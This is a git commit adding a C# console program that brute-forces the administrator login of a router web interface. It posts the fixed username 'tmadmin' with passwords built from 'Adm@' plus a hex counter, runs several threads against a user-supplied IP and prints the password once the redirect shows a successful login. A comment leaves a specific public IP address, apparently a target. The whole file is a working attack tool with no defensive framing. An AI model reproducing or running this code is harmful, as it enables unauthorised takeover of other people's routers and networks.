c469af02cfab1278fb0643544d5ee54e7926cd8d
hch12907 <haochengho12907@gmail.com>
2015-12-31 00:03:05 +0800

    Renaming and bug fixing
    Squash dem bugs

---
+++ riger-router-brute-in-cs.cs
@@ -0,0 +1,75 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Net.Http;
+using System.Threading;
+
+namespace TM_router
+{
+    class Program
+    {
+        static string target = "";
+        static void Main(string[] args)
+        {
+            while (true)
+            {
+                Console.WriteLine("Target IP: ");
+                target = "http://" + Console.ReadLine();
+                Console.WriteLine("Thread amount (1~8): ");
+                int thread_amount = int.Parse(Console.ReadLine());
+                Thread[] threads = new Thread[8];
+                for(int i = 0; i < thread_amount; i++)
+                {
+                    threads[i] = new Thread(Foo);
+                    threads[i].Start();
+                    Thread.Sleep(1000);
+                }
+            }
+        }
+
+        static UInt16 count = 0;
+        static bool isSuccess = false;
+
+        async static void Foo()
+        {
+            var handler = new HttpClientHandler()
+            {
+                AllowAutoRedirect = false
+            };
+
+            HttpClient client = new HttpClient(handler);
+            //FormUrlEncodedContent content;
+            string success = target + "/rpSys.html";
+
+            while (isSuccess != true)
+            {
+
+                string val = count.ToString("X");
+                var values = new Dictionary<string, string>
+                {
+                    { "LoginNameValue", "tmadmin" },
+                    { "LoginPasswordValue", "Adm@" + Zeroes(4-val.Length) + count.ToString("X") }
+            };
+                var content = new FormUrlEncodedContent(values);
+                var response = await client.PostAsync(target + "/Forms/TM2Auth_1", content);
+                Uri responseString = response.Headers.Location;
+
+                if (responseString.AbsoluteUri == success)
+                {
+                    isSuccess = true;
+                    Console.WriteLine("Success! Password is: {0}", values["LoginPasswordValue"]);
+                }
+                else
+                {
+                    Console.WriteLine("Attempt {0} failed. TEST: {1}, RESULT: {2} {3}", count, values["LoginPasswordValue"], responseString.AbsoluteUri, success);
+                }
+                //175.144.46.41
+                count++;
+            }
+        }
+        static string Zeroes(int n)
+        {
+            return new String('0', n);
+        }
+
+    }
+}
